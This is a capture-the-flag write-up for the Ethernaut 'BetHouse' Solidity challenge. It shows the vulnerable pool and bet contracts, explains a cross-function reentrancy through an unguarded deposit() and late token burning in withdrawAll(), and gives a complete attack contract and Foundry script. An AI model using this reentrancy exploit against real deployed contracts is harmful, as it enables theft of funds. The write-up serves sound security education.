# Ethernaut Level 34 BetHouse

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC20} from "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import {Ownable} from "openzeppelin-contracts-08/access/Ownable.sol";
import {ReentrancyGuard} from "openzeppelin-contracts-08/security/ReentrancyGuard.sol";

contract BetHouse {
    address public pool;
    uint256 private constant BET_PRICE = 20;
    mapping(address => bool) private bettors;

    error InsufficientFunds();
    error FundsNotLocked();

    constructor(address pool_) {
        pool = pool_;
    }

    function makeBet(address bettor_) external {
        if (Pool(pool).balanceOf(msg.sender) < BET_PRICE) {
            revert InsufficientFunds();
        }
        if (!Pool(pool).depositsLocked(msg.sender)) revert FundsNotLocked();
        bettors[bettor_] = true;
    }

    function isBettor(address bettor_) external view returns (bool) {
        return bettors[bettor_];
    }
}

contract Pool is ReentrancyGuard {
    address public wrappedToken;
    address public depositToken;

    mapping(address => uint256) private depositedEther;
    mapping(address => uint256) private depositedPDT;
    mapping(address => bool) private depositsLockedMap;
    bool private alreadyDeposited;

    error DepositsAreLocked();
    error InvalidDeposit();
    error AlreadyDeposited();
    error InsufficientAllowance();

    constructor(address wrappedToken_, address depositToken_) {
        wrappedToken = wrappedToken_;
        depositToken = depositToken_;
    }

    /**
     * @dev Provide 10 wrapped tokens for 0.001 ether deposited and
     *      1 wrapped token for 1 pool deposit token (PDT) deposited.
     *  The ether can only be deposited once per account.
     */
    function deposit(uint256 value_) external payable {
        // check if deposits are locked
        if (depositsLockedMap[msg.sender]) revert DepositsAreLocked();

        uint256 _valueToMint;
        // check to deposit ether
        if (msg.value == 0.001 ether) {
            if (alreadyDeposited) revert AlreadyDeposited();
            depositedEther[msg.sender] += msg.value;
            alreadyDeposited = true;
            _valueToMint += 10;
        }
        // check to deposit PDT
        if (value_ > 0) {
            if (PoolToken(depositToken).allowance(msg.sender, address(this)) < value_) revert InsufficientAllowance();
            depositedPDT[msg.sender] += value_;
            PoolToken(depositToken).transferFrom(msg.sender, address(this), value_);
            _valueToMint += value_;
        }
        if (_valueToMint == 0) revert InvalidDeposit();
        PoolToken(wrappedToken).mint(msg.sender, _valueToMint);
    }

    function withdrawAll() external nonReentrant {
        // send the PDT to the user
        uint256 _depositedValue = depositedPDT[msg.sender];
        if (_depositedValue > 0) {
            depositedPDT[msg.sender] = 0;
            PoolToken(depositToken).transfer(msg.sender, _depositedValue);
        }

        // send the ether to the user
        _depositedValue = depositedEther[msg.sender];
        if (_depositedValue > 0) {
            depositedEther[msg.sender] = 0;
            payable(msg.sender).call{value: _depositedValue}("");
        }

        PoolToken(wrappedToken).burn(msg.sender, balanceOf(msg.sender));
    }

    function lockDeposits() external {
        depositsLockedMap[msg.sender] = true;
    }

    function depositsLocked(address account_) external view returns (bool) {
        return depositsLockedMap[account_];
    }

    function balanceOf(address account_) public view returns (uint256) {
        return PoolToken(wrappedToken).balanceOf(account_);
    }
}

contract PoolToken is ERC20, Ownable {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) Ownable() {}

    function mint(address account, uint256 amount) external onlyOwner {
        _mint(account, amount);
    }

    function burn(address account, uint256 amount) external onlyOwner {
        _burn(account, amount);
    }
}
```

Our goal is to become the bettor in the bet house. We start at a balance of 5 `PoolToken`. If we take a closer look at the function `deposit(uint256 value_)`, we will know that we can deposit 0.001 eth (10 `wrappedToken`) and a maximum of 5 `PoolToken` (5 `wrappedToken`). So if we directly deposit all balances we have, we will end up with only 15 `wrappedToken`, which is still 5 tokens lower than the `BET_PRICE` limit. 

So a trivial thought on the attack strategy is re-entrancy. However, we cannot take that approach to call  `withdrawAll()` to drain the pool's balance of `poolToken`, since it is re-entrancy protected.

Though we still notice two key vulnerabilities in this code: 

1. `makeBet(address bettor_)` function has a fundamental logic defect: those who has *enough* balance can make basically *anyone* as the bettor, even though they has 0 balance.
2. Though `withdrawAll()` is re-entrancy guarded, `deposit(uint256 value_)` is not, which means that we can still call `deposit` in our attack contract's `receive()` function.

If we delve deeper into the `withdrawAll()` function, we can find a *third* vulnerability:

```solidity
function withdrawAll() external nonReentrant {
        // send the PDT to the user
        uint256 _depositedValue = depositedPDT[msg.sender];
        if (_depositedValue > 0) {
            depositedPDT[msg.sender] = 0;
            PoolToken(depositToken).transfer(msg.sender, _depositedValue);
        }

        // send the ether to the user
        _depositedValue = depositedEther[msg.sender];
        if (_depositedValue > 0) {
            depositedEther[msg.sender] = 0;
            payable(msg.sender).call{value: _depositedValue}("");
        }

        PoolToken(wrappedToken).burn(msg.sender, balanceOf(msg.sender));
    }
```

After transfering back the `poolToken` to the user, the corresponding `wrappedToken` is **not burned right away**. Other than that, it burns all `wrappedToken` **after** the eth is also transferred to the user. 

So our attack strategy is like this: 

1. The attack contract deposits all money (0.001 eth along with 5 `poolToken`) into the pool.
2. The attack contract calls `withdrawAll()`, which is going to trigger the attacker's `receive()` logic.
3. Inside the `receive()` function, since in `withdrawAll()`, we have had that 5 `poolToken` back (the `wrappedToken` balance is not burned yet), we can re-deposit that 5 token by calling the `deposit` function again. 
4. Now since our `wrappedToken` balance is `15 + 5 = 20`, we can lock our deposit and call `makeBet` inside the `receive()` function.
5. `receive()` done and all our `wrappedToken` burned.

`BetHouseAttack.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBetHouse {
    function makeBet(address bettor_) external;
    function pool() external view returns (address);
    function isBettor(address bettor_) external view returns (bool);
}

interface IPool {
    function deposit(uint256 value_) external payable;
    function withdrawAll() external;
    function lockDeposits() external;
    function depositToken() external view returns (address);
}

interface IPoolToken {
    function approve(address spender_, uint256 amount_) external returns (bool);
    function balanceOf(address account_) external view returns (uint256);
    function transfer(address to_, uint256 amount_) external returns (bool);
}

contract BetHouseAttack {
    IBetHouse betHouse;
    IPool pool;
    IPoolToken poolToken;
    address player;

    constructor(address betHouseAddress) {
        betHouse = IBetHouse(betHouseAddress);
        pool = IPool(betHouse.pool());
        poolToken = IPoolToken(pool.depositToken());
        player = msg.sender;
    }

    function attack() external payable {
        if (msg.value != 0.001 ether) {
            revert("send 0.001 ether to this contract to exploit");
        }

        // check deposit token balance of this contract
        if (poolToken.balanceOf(address(this)) < 5) {
            revert("transfer 5 deposit tokens to this contract to exploit");
        }

        poolToken.approve(address(pool), type(uint256).max);
        pool.deposit{value: msg.value}(5);

        pool.withdrawAll();
        (bool success, ) = player.call{value: address(this).balance}("");
        require(success, "transfer eth back to EOA failed");
    }

    receive() external payable {
        pool.deposit(5);
        pool.lockDeposits();
        betHouse.makeBet(player);
    }
}
```

Notice that we can transfer back the attacker's eth to EOA after `withdrawAll()` to save our eth.

`BetHouse.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {BetHouseAttack, IBetHouse, IPool, IPoolToken} from "../src/BetHouseAttack.sol";

contract BetHouseAttackScript is Script {
    address betHouseAddress = 0xXXXXXXXXXXX;
    IBetHouse betHouse = IBetHouse(betHouseAddress);
    IPool pool = IPool(betHouse.pool());
    IPoolToken poolToken = IPoolToken(pool.depositToken());

    function run() external {
        vm.startBroadcast();
        BetHouseAttack attackContract = new BetHouseAttack(betHouseAddress);

        bool success = poolToken.transfer(address(attackContract), 5);
        require(success, "transfer deposit tokens to attack contract failed");

        attackContract.attack{value: 0.001 ether}();
        require(betHouse.isBettor(msg.sender), "Attack failed");
        vm.stopBroadcast();
    }
}
```

Since our EOA (player) is not the attacker, we have to first transfer our `poolToken` to the attacker so that we can proceed. 